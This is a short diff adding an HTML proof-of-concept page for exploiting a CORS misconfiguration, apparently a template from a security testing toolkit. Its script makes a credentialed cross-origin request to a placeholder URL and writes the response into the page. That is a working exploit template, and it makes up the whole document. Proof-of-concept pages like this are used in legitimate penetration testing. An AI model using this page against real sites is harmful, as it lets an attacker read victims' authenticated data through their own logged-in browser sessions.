@@ -1,0 +1,14 @@
+<html>
+<center>
+<head><h1 style="color: blue;">CORS PoC</h1></head>
+</center>
+<body>
+<script>
+	var xhr = new XMLHttpRequest;
+	xhr.open('GET','https://{{URL}}', false);
+	xhr.withCredentials = true;
+	xhr.send();
+	document.write(xhr.responseText);
+</script>
+</body>
+</html>
